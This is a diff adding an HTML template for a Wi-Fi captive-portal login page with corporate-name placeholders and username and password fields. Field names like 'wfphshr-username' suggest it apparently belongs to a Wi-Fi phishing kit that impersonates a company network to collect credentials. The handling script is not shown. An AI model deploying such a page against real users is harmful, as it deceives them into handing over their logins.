@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex"/>
+    <title><span id="company-name"></span></title>
+    <link rel="icon" type="image/x-icon" href="sample.ico">
+    <link rel="stylesheet" href="static/css/style.css">
+</head>
+
+<body onload="document.querySelector('.container').classList.add('fade-in')">
+    <div class="background-image"></div>
+    <div class="container" id="container" fixed-height>
+        <img src="" class="logo" id="logo" alt="Wi-Fi Logo">
+        <h2><span id="custom-heading">[Custom Heading]</span></h2>
+        <p id="error-message" class="error-message"> </p>
+        <div id="login-form">
+            <input type="text" id="username" class="input-field" placeholder="Username" name="wfphshr-username">
+            <input type="password" id="password" class="input-field" placeholder="Password" name="wfphshr-password">
+            <button class="connect-btn" id="connect-btn">Connect</button>
+        </div>
+
+        <div class="accept-btn-container">
+            <button class="accept-btn hidden" id="accept-btn">Accept & Continue</button>
+        </div>
+
+        <small>By connecting, you agree to the <a id="privacy-policy" href="#"><span
+                    id="privacy-link"><span id="company-name">[Corporate]</span>'s Wi-Fi
+                Policy</a>.</span></small>
+    </div>
+
+    <script src="static/js/script.js"></script>
+
+</body>
+
+</html>
